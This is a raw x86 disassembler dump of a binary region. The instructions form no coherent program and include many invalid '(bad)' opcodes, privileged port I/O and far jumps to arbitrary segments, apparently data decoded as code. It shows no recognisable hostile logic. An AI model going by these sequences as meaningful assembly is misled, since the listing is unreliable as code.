  42b981:	fistp  DWORD PTR [esi-0x16bb2ee8]
  42b987:	arpl   di,si
  42b989:	sub    al,0xd7
  42b98b:	dec    edi
  42b98c:	xchg   ecx,eax
  42b98d:	mov    esi,0x57fbc30
  42b992:	out    0x39,al
  42b994:	daa    
  42b995:	adc    eax,0xd7725def
  42b99a:	sub    eax,0x5cb46b89
  42b99f:	retf   0x50d9
  42b9a2:	push   ds
  42b9a3:	or     DWORD PTR [ebx-0x116b14a],ebp
  42b9a9:	imul   esp,DWORD PTR [edi+eax*1],0xfe3a00a7
  42b9b0:	mov    ebp,0xc136f3b9
	...
  42ba15:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba1b:	neg    ebx
  42ba1d:	outs   dx,DWORD PTR ds:[esi]
  42ba1e:	xor    DWORD PTR [eax-0x80],eax
  42ba21:	fsincos 
  42ba23:	adc    edx,ebp
  42ba25:	sbb    eax,0x70001d2
  42ba2b:	add    DWORD PTR [eax],eax
  42ba2d:	add    BYTE PTR [esi],dl
  42ba2f:	sbb    eax,0x38733af7
  42ba34:	xor    al,0xa9
  42ba36:	push   esp
  42ba37:	pop    ebp
  42ba38:	fist   DWORD PTR [eax+0x75727fda]
  42ba3e:	aam    0xfa
  42ba40:	cwde   
  42ba41:	out    dx,eax
  42ba42:	mov    ebp,0xdf19c4ad
  42ba47:	and    esi,DWORD PTR [edx-0x31]
  42ba4a:	inc    ebp
  42ba4b:	lods   al,BYTE PTR ds:[esi]
  42ba4c:	push   ecx
  42ba4d:	add    eax,0xf957cff3
  42ba52:	inc    ecx
  42ba53:	inc    esi
  42ba54:	jo     0x42ba46
  42ba56:	sub    BYTE PTR [ecx-0x791e2250],dl
  42ba5c:	push   0x3d
  42ba5e:	(bad)  
  42ba5f:	and    bl,dh
  42ba61:	out    0xa1,al
  42ba63:	inc    BYTE PTR [eax-0x6e1676bb]
  42ba69:	sub    BYTE PTR [ebp+edx*8-0x41],al
  42ba6d:	ror    DWORD PTR [ebp+0x23],cl
  42ba70:	or     ah,dh
  42ba72:	mov    bh,0x1a
  42ba74:	in     eax,dx
  42ba75:	and    al,0x96
  42ba77:	push   0xb
  42ba79:	push   esi
  42ba7a:	mov    BYTE PTR [eax-0xcd32354],dh
  42ba80:	repnz pop esi
  42ba82:	stc    
  42ba83:	jmp    0xd7:0xb963a41a
  42ba8a:	adc    esi,DWORD PTR [ebp+0x54]
  42ba8d:	adc    ah,al
  42ba8f:	push   ecx
  42ba90:	xchg   BYTE PTR cs:[eax+ebx*1+0x24],dl
  42ba95:	gs stos DWORD PTR es:[edi],eax
  42ba97:	push   ss
  42ba98:	dec    ebx
  42ba99:	dec    edx
  42ba9a:	adc    DWORD PTR [ebp-0x6c],edi
  42ba9d:	push   es
  42ba9e:	inc    ebp
  42ba9f:	mov    ebp,DWORD PTR [ebx]
  42baa1:	and    DWORD PTR [esi+0x4b],ecx
  42baa4:	rol    al,0x1e
  42baa7:	xor    dh,BYTE PTR [ebx-0x47]
  42baaa:	xchg   edx,eax
  42baab:	adc    al,0xda
  42baad:	xchg   esi,eax
  42baae:	dec    edi
  42baaf:	cs mov ch,0x29
  42bab2:	sbb    ch,al
  42bab4:	icebp  
  42bab5:	xchg   edx,eax
  42bab6:	inc    esp
  42bab7:	push   eax
  42bab8:	cmp    al,0x30
  42baba:	cmp    ebx,eax
  42babc:	pop    eax
  42babd:	push   eax
  42babe:	(bad)  
  42babf:	and    DWORD PTR [ecx+0x6d],eax
  42bac2:	(bad)  
  42bac4:	loope  0x42bae6
  42bac6:	xor    BYTE PTR [ecx-0x6735a907],bl
  42bacc:	mov    ah,BYTE PTR [ecx-0x1b]
  42bacf:	jne    0x42ba6e
  42bad1:	mov    ebp,0xa42e9c14
  42bad6:	xor    cl,BYTE PTR [esi+0x7916e723]
  42badc:	and    edx,ebx
  42bade:	fucomip st,st(6)
  42bae0:	mov    esp,0x7cb5bbc8
  42bae5:	and    edi,0x5add7c06
  42baeb:	adc    eax,0xde3785e4
  42baf0:	push   ss
  42baf1:	adc    dl,al
  42baf3:	push   eax
  42baf4:	std    
  42baf5:	mov    edi,0xe9cbf332
  42bafa:	and    BYTE PTR fs:[eax],0xa1
  42bafe:	(bad)  [ebx+0x3fabe1e]
  42bb04:	jg     0x42bac8
  42bb06:	loop   0x42bb5b
  42bb08:	push   cs
  42bb09:	xlat   BYTE PTR ds:[ebx]
  42bb0a:	jno    0x42bb80
  42bb0c:	pop    eax
  42bb0d:	fbstp  TBYTE PTR [edi-0x19]
  42bb10:	mov    edx,0x81873122
  42bb15:	push   ebx
  42bb16:	push   ebp
  42bb17:	sbb    esi,DWORD PTR [eax]
  42bb19:	in     eax,0x83
  42bb1b:	xchg   DWORD PTR [ebx+0x693dcef6],esi
  42bb21:	mov    edi,0xe2c03bd7
  42bb26:	sbb    DWORD PTR [esi+0x447321fe],edx
  42bb2c:	pushf  
  42bb2d:	mov    edx,0x6631d73c
  42bb32:	es fild DWORD PTR gs:[eax]
	...
  42bb96:	xor    al,0x28
  42bb98:	add    DWORD PTR [esi],eax
  42bb9a:	sbb    eax,0x283a372f
  42bb9f:	in     al,0xd1
  42bba1:	and    edx,ebp
  42bba3:	xor    bl,dh
  42bba5:	xchg   esi,eax
  42bba6:	(bad)  
  42bba8:	add    DWORD PTR [eax],eax
  42bbaa:	pop    es
  42bbab:	add    DWORD PTR [eax],eax
  42bbad:	add    BYTE PTR [eax],dl
  42bbaf:	xchg   edi,eax
  42bbb0:	call   0x805c:0x77f39df6
  42bbb7:	or     al,0xf9
  42bbb9:	adc    DWORD PTR [esp+ecx*1],edi
  42bbbc:	cmp    DWORD PTR [ebp+0x7485e658],esi
  42bbc2:	stc    
  42bbc3:	mov    esp,0xb19d41f8
  42bbc8:	mov    ah,0x25
  42bbca:	ins    BYTE PTR es:[edi],dx
  42bbcb:	pop    ds
  42bbcc:	and    ebp,DWORD PTR [eax]
  42bbce:	outs   dx,BYTE PTR ds:[esi]
  42bbcf:	bound  ebx,QWORD PTR [esi*4-0x2a2062b9]
  42bbd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bbd7:	lods   eax,DWORD PTR ds:[esi]
  42bbd8:	ins    DWORD PTR es:[edi],dx
  42bbd9:	dec    esp
  42bbda:	add    eax,0xa63c7f1d
  42bbdf:	test   esp,esp
  42bbe1:	dec    eax
  42bbe2:	js     0x42bbf1
  42bbe4:	push   eax
  42bbe5:	lods   eax,DWORD PTR ds:[esi]
  42bbe6:	sub    eax,0xd8f9b3d9
  42bbeb:	aam    0xc
  42bbed:	out    0x48,eax
  42bbef:	or     al,0x74
  42bbf1:	imul   esi,DWORD PTR [ecx],0xffffffb2
  42bbf4:	idiv   al
  42bbf6:	inc    ecx
  42bbf7:	js     0x42bc06
  42bbf9:	jne    0x42bbdc
  42bbfb:	mov    WORD PTR [ecx],cs
  42bbfd:	jle    0x42bbcb
  42bbff:	adc    ebx,DWORD PTR [eax]
  42bc01:	lock sahf 
  42bc03:	pop    ecx
  42bc04:	sar    BYTE PTR [eax],cl
  42bc06:	jge    0x42bc25
  42bc08:	loop   0x42bc26
  42bc0a:	sbb    esi,eax
  42bc0c:	scas   eax,DWORD PTR es:[edi]
  42bc0d:	sar    DWORD PTR [eax+ebx*2+0x0],cl
  42bc11:	push   esp
  42bc12:	and    cl,BYTE PTR [eax]
  42bc14:	clc    
  42bc15:	(bad)  
  42bc16:	pushf  
  42bc17:	and    DWORD PTR [ebx+esi*4+0x5cd180f7],edx
  42bc1e:	jnp    0x42bc94
  42bc20:	jns    0x42bc6c
  42bc22:	jmp    0x294cb41
  42bc27:	dec    eax
  42bc28:	dec    ebx
  42bc29:	retf   0x4bb1
  42bc2c:	bound  esi,QWORD PTR [ecx-0x62]
  42bc2f:	push   0x52f99233
  42bc34:	mov    ds:0x57c65dc4,al
  42bc39:	jmp    0x42bc42
  42bc3b:	nop
  42bc3c:	aam    0xf
  42bc3e:	pop    ss
  42bc3f:	dec    ecx
  42bc40:	pop    ds
  42bc41:	xor    eax,0xa1a855ea
  42bc46:	adc    edx,DWORD PTR [edi-0xb]
  42bc49:	mov    esi,0xd0f9dfad
  42bc4e:	je     0x42bc67
  42bc50:	ret    0x473d
  42bc53:	cwde   
  42bc54:	jmp    0x4322:0x538dbe22
  42bc5b:	mov    ebx,0x14d3614e
  42bc60:	rcl    DWORD PTR [ebp+eax*8-0x3ff340a9],0xd6
  42bc68:	sbb    DWORD PTR [eax-0x3f],esp
  42bc6b:	inc    edi
  42bc6c:	cmp    eax,0x863d22f2
  42bc71:	dec    eax
  42bc72:	push   ebp
  42bc73:	mov    BYTE PTR [ebx+0x3ca7c282],bl
  42bc79:	test   eax,0x278db320
  42bc7e:	stc    
  42bc7f:	pop    ds
  42bc80:	add    al,0x52
  42bc82:	loopne 0x42bcf2
  42bc84:	or     ebp,edi
  42bc86:	adc    eax,0xa26308d1
  42bc8b:	pop    edx
  42bc8c:	sbb    DWORD PTR [edi+edx*2-0x2755b151],ebp
  42bc93:	inc    edi
  42bc94:	mov    bh,0x21
  42bc96:	stc    
  42bc97:	(bad)  
  42bc98:	jno    0x42bc76
  42bc9a:	dec    edi
  42bc9b:	test   eax,0x72fe502f
  42bca0:	xor    eax,0x43beba27
  42bca5:	fdivp  st(6),st
  42bca7:	pop    edi
  42bca8:	sbb    bh,bl
  42bcaa:	in     eax,dx
  42bcab:	stc    
  42bcac:	add    al,0x89
  42bcae:	loopne 0x42bcf1
  42bcb0:	inc    eax
  42bcb1:	mov    eax,ds:0x9b6327
	...
  42bd16:	mov    al,0xb6
  42bd18:	pushf  
  42bd19:	adc    al,0x9e
  42bd1b:	ds mov eax,0xde938ab6
  42bd21:	stc    
  42bd22:	or     al,0xb7
  42bd24:	ja     0x42bd6f
  42bd26:	out    0xd4,al
  42bd28:	add    DWORD PTR [eax],eax
  42bd2a:	pop    es
  42bd2b:	add    DWORD PTR [eax],eax
  42bd2d:	add    BYTE PTR [esi],bl
  42bd2f:	mov    eax,ds:0xadf7da12
  42bd34:	dec    eax
  42bd35:	ret    
  42bd36:	fsub   st,st(7)
  42bd38:	neg    DWORD PTR [edx]
  42bd3a:	sar    DWORD PTR [edi],cl
  42bd3c:	jmp    0x108d:0x5577adcb
  42bd43:	push   0xd93c6953
  42bd48:	mov    esp,0x7466aa00
  42bd4d:	popf   
  42bd4e:	jbe    0x42bd84
  42bd50:	xchg   ecx,eax
  42bd51:	mov    ecx,0x293e33c2
  42bd56:	jb     0x42bd46
  42bd58:	jo     0x42bda6
  42bd5a:	jbe    0x42bd69
  42bd5c:	cmp    eax,0x2e764c65
  42bd61:	fistp  QWORD PTR [edi-0x1a]
  42bd64:	mov    bl,0xdf
  42bd66:	jns    0x42bd12
  42bd68:	(bad)  
  42bd6a:	icebp  
  42bd6b:	pop    ds
  42bd6c:	clc    
  42bd6d:	jo     0x42bd02
  42bd6f:	ja     0x42bddc
  42bd71:	or     dh,BYTE PTR [edi-0x48]
  42bd74:	xlat   BYTE PTR ds:[ebx]
  42bd75:	bound  esi,QWORD PTR [edi]
  42bd77:	pop    es
  42bd78:	test   eax,0xd4d39c28
  42bd7d:	inc    ebx
  42bd7e:	dec    ecx
  42bd7f:	pop    esi
  42bd80:	outs   dx,BYTE PTR ds:[esi]
  42bd81:	cmp    eax,0xa3026eb5
  42bd86:	jbe    0x42bd5d
  42bd88:	sub    DWORD PTR [ebx+0x36bb383a],ebp
  42bd8e:	jecxz  0x42bd92
  42bd90:	xchg   ebx,eax
  42bd91:	in     eax,0x67
  42bd93:	aaa    
  42bd94:	inc    ecx
  42bd95:	add    eax,0x1f8f2dff
  42bd9a:	mov    ch,0x3d
  42bd9c:	imul   esi,DWORD PTR [eax+edx*1-0x1d],0xffffff93
  42bda1:	mov    eax,ds:0x50fcaa30
  42bda6:	pop    eax
  42bda7:	adc    al,0x60
  42bda9:	fisub  WORD PTR [edx+eax*1]
  42bdac:	js     0x42bd6d
  42bdae:	mov    WORD PTR [edi-0x12fdafb3],ds
  42bdb4:	push   eax
  42bdb5:	bound  ebp,QWORD PTR [esi]
  42bdb7:	fwait
  42bdb8:	dec    ecx
  42bdb9:	stc    
  42bdba:	sbb    dh,bl
  42bdbc:	jecxz  0x42bdc2
  42bdbe:	or     DWORD PTR [edx-0x74],edi
  42bdc1:	cs mov ecx,0xaa92be75
  42bdc7:	imul   ebx,DWORD PTR [ebx+0x72],0xffffffd3
  42bdcb:	out    0x23,eax
  42bdcd:	jmp    0x877d35c7
  42bdd2:	and    dl,BYTE PTR [edx+0x36]
  42bdd5:	xor    al,0x79
  42bdd7:	add    eax,ebx
  42bdd9:	mov    dl,0xf
  42bddb:	jo     0x42bddc
  42bddd:	shr    WORD PTR [edx+0x4f],0x50
  42bde2:	cmp    DWORD PTR [esi-0x5c],ebp
  42bde5:	pop    ss
  42bde6:	mov    ds:0xf1d64362,eax
  42bdeb:	fmul   DWORD PTR [ebx+0x44]
  42bdee:	std    
  42bdef:	pop    ds
  42bdf0:	or     ch,BYTE PTR [edi-0x577cc8e4]
  42bdf6:	push   0xf2959ca8
  42bdfb:	or     ah,BYTE PTR [esi+0x552fa3b5]
  42be01:	ficomp DWORD PTR [ebp+0x55e6a187]
  42be07:	adc    al,0xfb
  42be09:	fs popf 
  42be0b:	push   ds
  42be0c:	or     eax,0xbae6a580
  42be11:	iret   
  42be12:	xchg   edx,eax
  42be13:	jp     0x42bda0
  42be15:	push   0x3556f3a0
  42be1a:	sbb    ah,BYTE PTR [eax-0x7d]
  42be1d:	sbb    eax,DWORD PTR [ecx]
  42be1f:	add    al,0x7a
  42be21:	imul   ebx,ebx,0xffffffa1
  42be24:	or     ah,al
  42be26:	cwde   
  42be27:	js     0x42bdc7
  42be29:	push   0x1eb45ff4
  42be2e:	sbb    ch,ch
  42be30:	gs adc eax,esi
  42be33:	xchg   bl,al
	...
  42be95:	add    BYTE PTR [edi-0x825b8e0],dl
  42be9b:	call   FWORD PTR [edi-0x24a78c93]
  42bea1:	fld    QWORD PTR [esi]
  42bea3:	jno    0x42bf11
  42bea5:	(bad)  
  42bea6:	in     eax,dx
  42bea7:	aad    0x1
  42bea9:	add    BYTE PTR [edi],al
  42beab:	add    DWORD PTR [eax],eax
  42bead:	add    BYTE PTR [ebx+0x55],cl
  42beb0:	or     esi,eax
  42beb2:	dec    esi
  42beb3:	popa   
  42beb4:	inc    edi
  42beb5:	pop    ds
  42beb6:	xchg   BYTE PTR [edx+0x2c],dh
  42beb9:	sti    
  42beba:	repnz jmp 0x4803:0x275b3a5b
  42bec2:	push   eax
  42bec3:	pop    ebx
  42bec4:	mov    ah,0x6f
  42bec6:	xchg   esi,eax
  42bec7:	cmp    DWORD PTR [edi-0x2f],ebx
  42beca:	popf   
  42becb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42becc:	shr    BYTE PTR [ebp-0x5b0a6cd0],0xdc
  42bed3:	inc    ebp
  42bed4:	lods   al,BYTE PTR ds:[esi]
  42bed5:	cli    
  42bed6:	sub    eax,0x5407077a
  42bedb:	adc    BYTE PTR [ebx],ch
  42bedd:	pop    edi
  42bede:	in     eax,dx
  42bedf:	mov    ebx,0x836b3d61
  42bee4:	cdq    
  42bee5:	pop    edi
  42bee6:	or     dl,BYTE PTR [eax+0x5e]
  42bee9:	sbb    al,0x25
  42beeb:	inc    esi
  42beec:	cmp    al,0x25
  42beee:	pop    ebx
  42beef:	inc    edx
  42bef0:	fcomp  DWORD PTR [ecx+0x4ed24b83]
  42bef6:	sbb    eax,DWORD PTR [esi]
  42bef8:	jnp    0x42beca
  42befa:	cmp    al,0x5b
  42befc:	outs   dx,DWORD PTR ds:[esi]
  42befd:	mov    ebp,0x4ebe1c7c
  42bf02:	pushf  
  42bf03:	push   ebx
  42bf04:	outs   dx,BYTE PTR ds:[esi]
  42bf05:	cmp    BYTE PTR [esp+esi*8+0x2f033360],ch
  42bf0c:	xchg   edi,eax
  42bf0d:	vpsubusw ymm4,ymm5,YMMWORD PTR [edx+eax*2-0x56]
  42bf13:	add    al,BYTE PTR [edx-0x68]
  42bf16:	inc    ecx
  42bf17:	clc    
  42bf18:	hlt    
  42bf19:	jge    0x42bf0f
  42bf1b:	mov    ch,0xcb
  42bf1d:	push   edx
  42bf1e:	loope  0x42beb3
  42bf20:	push   ecx
  42bf21:	and    esi,DWORD PTR [ecx+0x27caadf2]
  42bf27:	pop    ebx
  42bf28:	loope  0x42bf69
  42bf2a:	dec    ecx
  42bf2b:	mov    cl,0xb6
  42bf2d:	aas    
  42bf2e:	int3   
  42bf2f:	adc    ebx,eax
  42bf31:	xor    BYTE PTR [edx+0x2c],cl
  42bf34:	push   ecx
  42bf35:	adc    bh,BYTE PTR [edi]
  42bf37:	fadd   st,st(2)
  42bf39:	jmp    FWORD PTR [ecx+0x71b7ce3a]
  42bf3f:	mov    al,ds:0x2d3ebc24
  42bf44:	jns    0x42bf89
  42bf46:	out    0x68,eax
  42bf48:	lea    edx,[ecx-0x7e28cb1c]
  42bf4e:	clc    
  42bf4f:	daa    
  42bf50:	xor    bh,cl
  42bf52:	mov    es,WORD PTR [esi]
  42bf54:	fist   DWORD PTR [ecx+0x111399b4]
  42bf5a:	and    BYTE PTR [edx+edx*2+0x240c9f29],0xba
  42bf62:	xchg   ebp,eax
  42bf63:	fwait
  42bf64:	adc    esp,eax
  42bf66:	arpl   sp,ax
  42bf68:	xlat   BYTE PTR ds:[ebx]
  42bf69:	stc    
  42bf6a:	pop    es
  42bf6b:	xchg   esp,eax
  42bf6c:	inc    ecx
  42bf6d:	and    eax,0xae630dd3
  42bf72:	test   BYTE PTR [edi-0x383742cf],ch
  42bf78:	jno    0x42bf6a
  42bf7a:	in     eax,0x51
  42bf7c:	lock (bad) 
  42bf7e:	pushf  
  42bf7f:	push   esp
  42bf80:	add    ch,BYTE PTR [esi]
  42bf82:	jl     0x42bf48
  42bf84:	inc    esp
  42bf85:	repnz sub al,0xd0
  42bf88:	mov    cl,0x9
  42bf8a:	outs   dx,DWORD PTR ds:[esi]
  42bf8b:	cdq    
  42bf8c:	jo     0x42c00b
  42bf8e:	loop   0x42bf9c
  42bf90:	add    eax,0xa7d73eef
  42bf95:	adc    al,0x3f
  42bf97:	push   es
  42bf98:	ins    BYTE PTR es:[edi],dx
  42bf99:	add    eax,0xb189fa1b
  42bf9e:	xlat   BYTE PTR ds:[ebx]
  42bf9f:	(bad)  
  42bfa0:	push   edi
  42bfa1:	and    BYTE PTR [esi],al
  42bfa3:	test   DWORD PTR [ecx+edi*1-0x6ff4e342],esi
  42bfaa:	mov    ds:0x2f9b13ed,eax
  42bfaf:	(bad)  
  42bfb1:	jge    0x42bfc9
  42bfb3:	jmp    0x42bfe9
	...
  42c015:	add    BYTE PTR [edx],bh
  42c017:	xchg   edx,eax
  42c018:	ja     0x42c04c
  42c01a:	push   edi
  42c01c:	jg     0x42bfb8
  42c01e:	xchg   ebx,eax
  42c01f:	mov    al,ds:0xa0f0f806
  42c024:	mov    dl,0x81
  42c026:	hlt    
  42c027:	(bad)  
  42c028:	add    DWORD PTR [eax],eax
  42c02a:	pop    es
  42c02b:	add    DWORD PTR [eax],eax
  42c02d:	add    BYTE PTR [ecx-0x41],cl
  42c030:	adc    al,0xb9
  42c032:	pusha  
  42c033:	lds    ecx,FWORD PTR [esi-0x2]
  42c036:	pop    ss
  42c037:	pop    es
  42c038:	lods   al,BYTE PTR ds:[esi]
  42c039:	das    
  42c03a:	add    BYTE PTR [ebp-0x7a7cfb1d],cl
  42c040:	inc    edi
  42c041:	add    BYTE PTR [edx+ecx*2],bl
  42c044:	adc    al,BYTE PTR [esi]
  42c046:	inc    esp
  42c047:	(bad)  
  42c048:	ja     0x42bfcf
  42c04a:	mov    esp,DWORD PTR [edx-0x2]
  42c04d:	dec    esi
  42c04e:	scas   al,BYTE PTR es:[edi]
  42c04f:	mov    ecx,0xda56bbaf
  42c054:	fiadd  WORD PTR [eax+ebx*4+0x1c9441fa]
  42c05b:	mov    ah,0xf3
  42c05d:	out    0x24,al
  42c05f:	into   
  42c060:	and    edx,DWORD PTR [ebx+esi*2+0x2351ce66]
  42c067:	or     al,0x4b
  42c069:	loopne 0x42c077
  42c06b:	call   0x308e:0x2ac625fe
  42c072:	std    
  42c073:	dec    edx
  42c074:	mov    ah,0x98
  42c076:	jmp    0xdd757c94
  42c07b:	loop   0x42c0f8
  42c07d:	dec    edi
  42c07e:	pop    edi
  42c07f:	or     ebx,DWORD PTR [ecx+0x77]
  42c082:	inc    ecx
  42c083:	push   0x40
  42c085:	lods   eax,DWORD PTR ds:[esi]
  42c086:	cmp    eax,0x6609e440
  42c08b:	retf   
  42c08c:	dec    eax
  42c08d:	in     eax,dx
  42c08e:	dec    ebx
  42c08f:	adc    ecx,esp
  42c091:	shl    DWORD PTR [edi+esi*2],cl
  42c094:	fstp   QWORD PTR [eax+0xf]
  42c097:	push   cs
  42c098:	idiv   BYTE PTR [esi]
  42c09a:	cmp    DWORD PTR [edi+0x63],edi
  42c09d:	add    cl,BYTE PTR [ecx+0x36c6fc1]
  42c0a3:	test   DWORD PTR [esi+0x131e7813],edx
  42c0a9:	loope  0x42c04c
  42c0ab:	push   eax
  42c0ac:	inc    edx
  42c0ad:	pop    ss
  42c0ae:	inc    esi
  42c0af:	cs in  al,dx
  42c0b1:	dec    ebp
  42c0b2:	xor    al,0xfb
  42c0b4:	xor    BYTE PTR [ebx+0x78],al
  42c0b7:	jg     0x42c03c
  42c0b9:	adc    eax,0x3c90d020
  42c0be:	xchg   edx,eax
  42c0bf:	mov    ebx,0x4f6536e3
  42c0c4:	(bad)  
  42c0c5:	cwde   
  42c0c6:	or     BYTE PTR [edi-0x3e],ah
  42c0c9:	cli    
  42c0ca:	enter  0x781e,0x37
  42c0ce:	and    DWORD PTR [edx],ebp
  42c0d0:	jbe    0x42c151
  42c0d2:	xor    bl,BYTE PTR [ebx+0x2ae01bc4]
  42c0d8:	jge    0x42c0e0
  42c0da:	cli    
  42c0db:	ret    
  42c0dc:	push   DWORD PTR [edx]
  42c0de:	popf   
  42c0df:	sbb    bl,BYTE PTR [edx+0x4daed321]
  42c0e5:	(bad)  
  42c0e7:	sub    eax,0xe2ba8eb8
  42c0ec:	popa   
  42c0ed:	sub    ah,BYTE PTR [ebx-0x4e]
  42c0f0:	ins    DWORD PTR es:[edi],dx
  42c0f1:	sub    DWORD PTR [ebx-0x11621492],ebp
  42c0f7:	test   al,0x3
  42c0f9:	shr    dh,1
  42c0fb:	and    al,BYTE PTR [ecx+esi*8+0x9]
  42c0ff:	mov    dl,0xa8
  42c101:	inc    ebp
  42c102:	fcomp  DWORD PTR ds:0x13d2302e
  42c108:	mov    ds:0xfd138bdc,eax
  42c10d:	mov    ds:0x11506433,eax
  42c112:	(bad)  
  42c114:	or     esi,edi
  42c116:	and    al,0x92
  42c118:	out    dx,eax
  42c119:	sbb    esi,DWORD PTR [esi-0x54b2971c]
  42c11f:	xchg   edx,eax
  42c120:	pop    ebp
  42c121:	jl     0x42c101
  42c123:	pop    edi
  42c124:	aam    0x85
  42c126:	outs   dx,DWORD PTR ds:[esi]
  42c127:	dec    edx
  42c128:	fld    QWORD PTR [edi+0x26eaf244]
  42c12e:	fwait
  42c12f:	loope  0x42c107
  42c131:	inc    eax
  42c132:	int    0x27
  42c134:	aas    
	...
  42c195:	add    BYTE PTR [ecx-0x7e],ch
  42c198:	int    0xae
  42c19a:	out    dx,eax
  42c19b:	out    dx,eax
  42c19c:	imul   eax,edi,0xffffffa4
  42c19f:	aas    
  42c1a0:	cld    
  42c1a1:	push   ss
  42c1a2:	js     0x42c14d
  42c1a4:	jnp    0x42c179
  42c1a6:	sti    
  42c1a7:	xlat   BYTE PTR ds:[ebx]
  42c1a8:	add    DWORD PTR [eax],eax
  42c1aa:	pop    es
  42c1ab:	add    DWORD PTR [eax],eax
  42c1ad:	add    BYTE PTR [eax+0x7c132eaa],ch
  42c1b3:	int    0x25
  42c1b5:	into   
  42c1b6:	push   ebp
  42c1b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c1b8:	push   ebp
  42c1b9:	ins    DWORD PTR es:[edi],dx
  42c1ba:	push   0xac077582
  42c1bf:	jmp    DWORD PTR [esi+eax*4+0x3]
  42c1c3:	mov    al,ds:0xe262d092
  42c1c8:	add    ebp,edi
  42c1ca:	shr    BYTE PTR [edi+eiz*2-0x43],1
  42c1ce:	xchg   edi,eax
  42c1cf:	dec    eax
  42c1d0:	and    ch,ah
  42c1d2:	retf   
  42c1d3:	sbb    esi,DWORD PTR [ebx+0x844a8ed]
  42c1d9:	dec    ecx
  42c1da:	fdiv   st,st(5)
  42c1dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c1dd:	push   ds
  42c1de:	sub    eax,0xc6f9b217
  42c1e3:	pop    ebp
  42c1e4:	push   0xffffffe0
  42c1e6:	mov    BYTE PTR [edi-0x8],cl
  42c1e9:	xchg   esi,eax
  42c1ea:	lods   al,BYTE PTR ds:[esi]
  42c1eb:	jo     0x42c259
  42c1ed:	cmp    DWORD PTR [edi],0x5c40f227
  42c1f3:	cmp    BYTE PTR fs:[ebp-0xb8bdcdc],0xe7
  42c1fb:	and    eax,0xba238919
  42c200:	push   edi
  42c201:	inc    eax
  42c202:	dec    ebx
  42c203:	dec    esi
  42c204:	adc    edi,ecx
  42c206:	or     DWORD PTR [ebp+0x29],0x16
  42c20a:	inc    esi
  42c20b:	jmp    0xd36d:0xac40339e
  42c212:	ss xchg eax,ebp
  42c215:	aam    0x8e
  42c217:	or     BYTE PTR [edx+ebx*2+0x4b419eb6],bl
  42c21e:	loope  0x42c1ea
  42c220:	fidivr WORD PTR [edx]
  42c222:	mov    ecx,0x82a94acb
  42c227:	mov    BYTE PTR [eax+0x1c],ch
  42c22a:	fsubr  QWORD PTR [edx-0x45ef66e0]
  42c230:	dec    ebp
  42c231:	xchg   esp,eax
  42c232:	test   eax,0xacf61f08
  42c237:	cmp    esp,esp
  42c239:	ret    0x2c43
  42c23c:	mov    dh,0x8b
  42c23e:	xchg   edi,eax
  42c23f:	in     al,0x13
  42c241:	and    DWORD PTR [ebx+eax*1+0x361a5b84],esi
  42c248:	push   esi
  42c249:	cli    
  42c24a:	fistp  QWORD PTR gs:[eax-0xbd1302]
  42c251:	xor    DWORD PTR [edi],0xffffffe4
  42c254:	pop    esi
  42c255:	pop    esi
  42c256:	retf   
  42c257:	cmp    DWORD PTR [ebx],eax
  42c259:	lahf   
  42c25a:	mov    ebx,0x102692e1
  42c25f:	dec    ebx
  42c260:	xchg   esp,ebx
  42c262:	mov    ?,WORD PTR [edx]
  42c264:	xor    al,0x12
  42c266:	in     al,dx
  42c267:	in     al,dx
  42c268:	call   0x7bf5e94f
  42c26d:	inc    ebx
  42c26e:	or     al,0xc2
  42c270:	mov    dh,0x44
  42c272:	ds mov al,0xbc
  42c275:	push   ebx
  42c276:	dec    edi
  42c277:	xor    esi,ecx
  42c279:	sbb    ah,BYTE PTR [ecx+edx*8+0x9b856c0]
  42c280:	fimul  DWORD PTR [ecx+ebx*8+0x716e8b65]
  42c287:	out    dx,eax
  42c288:	ret    0x1f5f
  42c28b:	and    dh,ch
  42c28d:	or     DWORD PTR [ebp+eiz*4+0x63],edi
  42c291:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c292:	jg     0x42c2b1
  42c294:	mov    bl,BYTE PTR [esi+0x3a]
  42c297:	or     eax,0xe62d4222
  42c29c:	push   ss
  42c29d:	scas   eax,DWORD PTR es:[edi]
  42c29e:	xchg   edi,eax
  42c29f:	push   ebp
  42c2a0:	rcr    DWORD PTR [ebx*1-0x4b1475b3],cl
  42c2a7:	mov    bh,0xcd
  42c2a9:	jle    0x42c285
  42c2ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c2ac:	popf   
  42c2ad:	popa   
  42c2ae:	push   esi
  42c2af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c2b0:	or     DWORD PTR [esi],ecx
  42c2b2:	retf   0x9877
	...
  42c315:	add    dh,ah
  42c317:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c31b:	push   esi
  42c31d:	(bad)  
  42c31e:	adc    esi,DWORD PTR [ebx]
  42c320:	xchg   ebp,eax
  42c321:	sbb    ecx,DWORD PTR [ebx+0x5e]
  42c324:	dec    eax
  42c325:	jns    0x42c329
  42c327:	fld    DWORD PTR [ecx]
  42c329:	add    BYTE PTR [edi],al
  42c32b:	add    DWORD PTR [eax],eax
  42c32d:	add    BYTE PTR [ebp+0x6c],dl
  42c330:	mov    bl,0xcb
  42c332:	fisub  WORD PTR ds:0x7aea742d
  42c338:	pop    ds
  42c339:	jl     0x42c3a0
  42c33b:	cdq    
  42c33c:	sahf   
  42c33d:	ret    
  42c33e:	mov    bh,BYTE PTR [eax-0xa]
  42c341:	push   es
  42c342:	(bad)  
  42c343:	or     edi,DWORD PTR ds:0x16a1b09c
  42c349:	jbe    0x42c2d1
  42c34b:	call   0x188abf92
  42c350:	xor    DWORD PTR ds:0x5024c2a2,ebp
  42c356:	jg     0x42c356
  42c358:	or     edi,esp
  42c35a:	stc    
  42c35b:	mov    ecx,0xc47931c
  42c360:	adc    BYTE PTR [edi],bh
  42c362:	adc    edi,esp
  42c364:	xor    eax,0xd40dacfc
  42c369:	adc    ecx,DWORD PTR fs:0x9d7c55c9
  42c370:	pop    ecx
  42c371:	sbb    cl,bl
  42c373:	dec    ecx
  42c374:	(bad)  
  42c377:	rcl    DWORD PTR [esi],cl
  42c379:	repnz push es
  42c37b:	adc    BYTE PTR [edi],cl
  42c37d:	cmp    eax,0x9633991e
